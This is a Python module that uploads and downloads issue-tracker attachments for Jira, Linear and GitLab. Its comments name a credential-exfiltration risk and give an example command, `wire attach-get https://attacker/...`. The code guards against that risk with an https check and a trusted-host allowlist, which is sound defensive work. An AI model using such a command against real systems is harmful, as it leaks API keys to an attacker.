"""Per-provider attachment upload / retrieval routes (fn-140.4).

Measured routes (2026-07-26):
  jira   POST /rest/api/2/issue/{key}/attachments + X-Atlassian-Token: no-check
         (missing header → 404 that classify surfaces as xsrf, not not_found);
         GET  /rest/api/2/attachment/content/{id}
  linear fileUpload → presigned PUT (PRESIGNED_ANONYMOUS, size EXACT) →
         attachmentCreate referencing assetUrl;
         retrieval GET assetUrl WITH provider auth
  gitlab POST /projects/:id/uploads via HTTP multipart (op=upload; NEVER glab
         api -F - executor forbids the CLI upload route);
         GET /projects/:id/uploads/:upload_id (never the markdown /uploads/<secret>/ path)
  github attachments: false - gated before any request (see attach.dispatch)
"""

from __future__ import annotations

import hashlib
import json
import mimetypes
from pathlib import Path
from typing import Optional, Union
from urllib.parse import quote

from ..classify import classify
from ..types import CredentialPolicy, ErrorClass, Request, Response, TrackerError
from ..wire import (
    Execute,
    Result,
    _destination,
    _gql,
    _jira_base,
    parent_read,
)

#: Trusted origins for Linear asset retrieval - attach-get sends the LINEAR
#: API KEY with the request, so an arbitrary URL is a credential-exfiltration
#: primitive (`wire attach-get https://attacker/...`). Measured assetUrl host:
#: uploads.linear.app.
_LINEAR_ASSET_HOSTS = ("uploads.linear.app", "files.linear.app")


def _random_boundary(payload: bytes) -> str:
    """A fixed boundary can collide with binary payload bytes at a MIME line
    boundary (truncation/rejection). Generate one absent from the payload."""
    import secrets  # noqa: PLC0415
    while True:
        candidate = f"----flowctl-{secrets.token_hex(16)}"
        if candidate.encode() not in payload:
            return candidate


def _sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _as_error(provider: str, result: Union[Response, TrackerError]
              ) -> Optional[TrackerError]:
    if isinstance(result, TrackerError):
        return result
    if isinstance(result, Response) and result.status >= 400:
        return classify(provider, result) or TrackerError(
            ErrorClass.TRANSPORT, f"{provider} attach HTTP {result.status}",
            subtype="http")
    return None


def _multipart(filename: str, data: bytes, *, field: str = "file",
               content_type: Optional[str] = None) -> tuple[bytes, str]:
    ctype = content_type or mimetypes.guess_type(filename)[0] or "application/octet-stream"
    boundary = _random_boundary(data)
    # Keep filename ASCII-safe for the disposition header.
    safe = filename.replace('"', "_").replace("\r", "").replace("\n", "")
    parts = [
        f"--{boundary}\r\n".encode(),
        (f'Content-Disposition: form-data; name="{field}"; '
         f'filename="{safe}"\r\n').encode(),
        f"Content-Type: {ctype}\r\n\r\n".encode(),
        data,
        b"\r\n",
        f"--{boundary}--\r\n".encode(),
    ]
    body = b"".join(parts)
    return body, f"multipart/form-data; boundary={boundary}"


def _write_out(out_path: str, data: bytes) -> Optional[TrackerError]:
    try:
        Path(out_path).write_bytes(data)
    except OSError as exc:
        return TrackerError(ErrorClass.INVALID_INPUT,
                            f"cannot write --out: {exc}", subtype="out")
    return None


# ---------------------------------------------------------------------------
# Jira
# ---------------------------------------------------------------------------

def _jira_upload(config: dict, locator: dict, execute: Execute, *,
                 path: Path, data: bytes) -> Result:
    parent = parent_read("jira", config, locator, execute, op="wire-parent-read")
    if isinstance(parent, TrackerError):
        return parent
    dest = _destination(config)
    if isinstance(dest, TrackerError):
        return dest
    base = _jira_base(config, dest)
    if isinstance(base, TrackerError):
        return base
    body, ctype = _multipart(path.name, data)
    # Address by display key (same parent-gate convention as other jira writes).
    key = locator["display"]
    url = f"{base}/rest/api/2/issue/{quote(str(key), safe='')}/attachments"
    result = execute(Request(
        provider="jira", op="wire-attach", method="POST", url_or_argv=url,
        headers={
            "Content-Type": ctype,
            "Accept": "application/json",
            "X-Atlassian-Token": "no-check",
        },
        body=body,
    ))
    err = _as_error("jira", result)
    if err:
        return err
    if not isinstance(result, Response):
        return TrackerError(ErrorClass.TRANSPORT, "no response from transport",
                            subtype="transport")
    try:
        payload = json.loads(result.body or b"null")
    except (ValueError, TypeError) as exc:
        return TrackerError(ErrorClass.TRANSPORT, f"malformed jira attach: {exc}",
                            subtype="malformed_body")
    # Response is a list of attachment objects.
    item = payload[0] if isinstance(payload, list) and payload else payload
    if not isinstance(item, dict) or item.get("id") is None:
        return TrackerError(ErrorClass.TRANSPORT, "jira attach returned no id",
                            subtype="malformed_body")
    return {
        "id": str(item["id"]),
        "url": item.get("content") or item.get("self"),
        "size": len(data),
        "sha256": _sha(data),
    }


def _jira_download(config: dict, execute: Execute, *, attachment_id: str,
                   out_path: str) -> Result:
    dest = _destination(config)
    if isinstance(dest, TrackerError):
        return dest
    base = _jira_base(config, dest)
    if isinstance(base, TrackerError):
        return base
    url = (f"{base}/rest/api/2/attachment/content/"
           f"{quote(str(attachment_id), safe='')}")
    result = execute(Request(
        provider="jira", op="wire-attach-get", method="GET", url_or_argv=url,
        headers={"Accept": "*/*"},
        idempotent=True,
        credential_policy=CredentialPolicy.PROVIDER_AUTH,
    ))
    err = _as_error("jira", result)
    if err:
        return err
    if not isinstance(result, Response):
        return TrackerError(ErrorClass.TRANSPORT, "no response from transport",
                            subtype="transport")
    raw = result.body or b""
    werr = _write_out(out_path, raw)
    if werr:
        return werr
    return {"id": attachment_id, "size": len(raw), "sha256": _sha(raw),
            "out": out_path}


# ---------------------------------------------------------------------------
# Linear
# ---------------------------------------------------------------------------

def _linear_upload(config: dict, locator: dict, execute: Execute, *,
                   path: Path, data: bytes) -> Result:
    parent = parent_read("linear", config, locator, execute, op="wire-parent-read")
    if isinstance(parent, TrackerError):
        return parent
    ctype = mimetypes.guess_type(path.name)[0] or "application/octet-stream"
    size = len(data)
    gql = _gql(
        execute, "wire-attach-fileUpload",
        "mutation($contentType: String!, $filename: String!, $size: Int!) { "
        "fileUpload(contentType: $contentType, filename: $filename, size: $size) { "
        "success uploadFile { uploadUrl assetUrl headers { key value } } } }",
        {"contentType": ctype, "filename": path.name, "size": size},
    )
    if isinstance(gql, TrackerError):
        return gql
    payload = gql.get("fileUpload")
    if not isinstance(payload, dict) or payload.get("success") is not True:
        return TrackerError(ErrorClass.TRANSPORT, "linear fileUpload failed",
                            subtype="mutation_failed")
    upload = payload.get("uploadFile")
    if not isinstance(upload, dict):
        return TrackerError(ErrorClass.TRANSPORT, "linear fileUpload missing uploadFile",
                            subtype="malformed_body")
    upload_url = upload.get("uploadUrl")
    asset_url = upload.get("assetUrl")
    if not isinstance(upload_url, str) or not isinstance(asset_url, str):
        return TrackerError(ErrorClass.TRANSPORT, "linear fileUpload missing urls",
                            subtype="malformed_body")
    headers = {"Content-Type": ctype, "Cache-Control": "public, max-age=31536000"}
    for h in upload.get("headers") or []:
        if isinstance(h, dict) and h.get("key") and h.get("value") is not None:
            headers[str(h["key"])] = str(h["value"])
    # PRESIGNED_ANONYMOUS: no Linear key on the third-party asset host.
    put = execute(Request(
        provider="linear", op="wire-attach-presigned-put", method="PUT",
        url_or_argv=upload_url, headers=headers, body=data,
        credential_policy=CredentialPolicy.PRESIGNED_ANONYMOUS,
    ))
    err = _as_error("linear", put)
    if err:
        return err
    # Reference the asset on the issue.
    ref = _gql(
        execute, "wire-attach-create",
        "mutation($input: AttachmentCreateInput!) { "
        "attachmentCreate(input: $input) { success attachment { id url } } }",
        {"input": {"issueId": locator["durable"], "url": asset_url,
                   "title": path.name}},
    )
    if isinstance(ref, TrackerError):
        return _linear_uploaded_error(
            ref, asset_url=asset_url, size=size, data=data)
    ref_payload = ref.get("attachmentCreate")
    if not isinstance(ref_payload, dict) or ref_payload.get("success") is not True:
        return _linear_uploaded_error(
            TrackerError(
                ErrorClass.TRANSPORT,
                "linear attachmentCreate reported failure",
                subtype="mutation_failed"),
            asset_url=asset_url, size=size, data=data)
    return {"id": asset_url, "url": asset_url, "size": size, "sha256": _sha(data)}


def _linear_uploaded_error(err: TrackerError, *, asset_url: str, size: int,
                           data: bytes) -> TrackerError:
    """Preserve the successful asset PUT when attachmentCreate fails."""
    details = dict(err.details or {})
    completed = list(details.get("completed_steps") or [])
    if "asset-upload" not in completed:
        completed.append("asset-upload")
    details.update({
        "completed_steps": completed,
        "asset_url": asset_url,
        "size": size,
        "sha256": _sha(data),
        "recoverable": True,
    })
    return TrackerError(
        err.cls, err.message, subtype=err.subtype,
        retry_after_s=err.retry_after_s, details=details,
        auto_retryable=err.auto_retryable)


def _linear_download(config: dict, execute: Execute, *, attachment_id: str,
                     out_path: str) -> Result:
    # attachment_id IS the assetUrl returned by upload. The request carries the
    # LINEAR API KEY, so the origin MUST be a trusted Linear asset host - an
    # arbitrary URL here is a credential-exfiltration primitive.
    from urllib.parse import urlparse  # noqa: PLC0415
    try:
        # urlparse / .hostname raise ValueError on malformed input (e.g.
        # "https://["). Fail CLOSED: reject as untrusted, never bypass.
        parsed = urlparse(str(attachment_id))
        scheme = parsed.scheme
        hostname = parsed.hostname
    except ValueError:
        return TrackerError(
            ErrorClass.INVALID_INPUT,
            f"linear attach-get only retrieves from trusted Linear asset hosts "
            f"{_LINEAR_ASSET_HOSTS} over https; attachment id is not a "
            f"parseable URL",
            subtype="untrusted_origin")
    if scheme != "https" or (hostname or "").lower() not in _LINEAR_ASSET_HOSTS:
        return TrackerError(
            ErrorClass.INVALID_INPUT,
            f"linear attach-get only retrieves from trusted Linear asset hosts "
            f"{_LINEAR_ASSET_HOSTS} over https; got {hostname!r}",
            subtype="untrusted_origin")
    result = execute(Request(
        provider="linear", op="wire-attach-get", method="GET",
        url_or_argv=attachment_id, headers={"Accept": "*/*"},
        idempotent=True,
        credential_policy=CredentialPolicy.PROVIDER_AUTH,
    ))
    err = _as_error("linear", result)
    if err:
        return err
    if not isinstance(result, Response):
        return TrackerError(ErrorClass.TRANSPORT, "no response from transport",
                            subtype="transport")
    raw = result.body or b""
    werr = _write_out(out_path, raw)
    if werr:
        return werr
    return {"id": attachment_id, "size": len(raw), "sha256": _sha(raw),
            "out": out_path}


# ---------------------------------------------------------------------------
# GitLab
# ---------------------------------------------------------------------------

def _gl_api_base(dest: dict) -> Union[str, TrackerError]:
    host = dest.get("host") or "gitlab.com"
    host = str(host).rstrip("/")
    if host.startswith(("http://", "https://")):
        return f"{host}/api/v4"
    return f"https://{host}/api/v4"


def _gitlab_upload(config: dict, locator: dict, execute: Execute, *,
                   path: Path, data: bytes) -> Result:
    parent = parent_read("gitlab", config, locator, execute, op="wire-parent-read")
    if isinstance(parent, TrackerError):
        return parent
    dest = _destination(config)
    if isinstance(dest, TrackerError):
        return dest
    pid = dest.get("projectId")
    if not isinstance(pid, int):
        return TrackerError(ErrorClass.UNRESOLVED,
                            "gitlab destination missing numeric projectId",
                            subtype="destination")
    base = _gl_api_base(dest)
    if isinstance(base, TrackerError):
        return base
    body, ctype = _multipart(path.name, data)
    # op MUST be "upload" so the executor forbids the broken glab CLI route.
    url = f"{base}/projects/{pid}/uploads"
    result = execute(Request(
        provider="gitlab", op="upload", method="POST", url_or_argv=url,
        headers={"Content-Type": ctype, "Accept": "application/json"},
        body=body,
        credential_policy=CredentialPolicy.PROVIDER_AUTH,
    ))
    err = _as_error("gitlab", result)
    if err:
        return err
    if not isinstance(result, Response):
        return TrackerError(ErrorClass.TRANSPORT, "no response from transport",
                            subtype="transport")
    # Assert HTTP route: url_or_argv must be a str, not argv list.
    try:
        payload = json.loads(result.body or b"null")
    except (ValueError, TypeError) as exc:
        return TrackerError(ErrorClass.TRANSPORT, f"malformed gitlab upload: {exc}",
                            subtype="malformed_body")
    if not isinstance(payload, dict) or payload.get("id") is None:
        return TrackerError(ErrorClass.TRANSPORT, "gitlab upload returned no id",
                            subtype="malformed_body")
    return {
        "id": str(payload["id"]),
        "url": payload.get("url") or payload.get("full_path"),
        "size": len(data),
        "sha256": _sha(data),
    }


def _gitlab_download(config: dict, execute: Execute, *, attachment_id: str,
                     out_path: str) -> Result:
    dest = _destination(config)
    if isinstance(dest, TrackerError):
        return dest
    pid = dest.get("projectId")
    if not isinstance(pid, int):
        return TrackerError(ErrorClass.UNRESOLVED,
                            "gitlab destination missing numeric projectId",
                            subtype="destination")
    base = _gl_api_base(dest)
    if isinstance(base, TrackerError):
        return base
    # Retrieval by upload_id ONLY - never the markdown /uploads/<secret>/ path.
    url = f"{base}/projects/{pid}/uploads/{quote(str(attachment_id), safe='')}"
    result = execute(Request(
        provider="gitlab", op="wire-attach-get", method="GET", url_or_argv=url,
        headers={"Accept": "*/*"},
        idempotent=True,
        credential_policy=CredentialPolicy.PROVIDER_AUTH,
    ))
    err = _as_error("gitlab", result)
    if err:
        return err
    if not isinstance(result, Response):
        return TrackerError(ErrorClass.TRANSPORT, "no response from transport",
                            subtype="transport")
    raw = result.body or b""
    werr = _write_out(out_path, raw)
    if werr:
        return werr
    return {"id": attachment_id, "size": len(raw), "sha256": _sha(raw),
            "out": out_path}


class _Jira:
    upload = staticmethod(_jira_upload)
    download = staticmethod(_jira_download)


class _Linear:
    upload = staticmethod(_linear_upload)
    download = staticmethod(_linear_download)


class _Gitlab:
    upload = staticmethod(_gitlab_upload)
    download = staticmethod(_gitlab_download)


PROVIDERS = {
    "jira": _Jira,
    "linear": _Linear,
    "gitlab": _Gitlab,
}
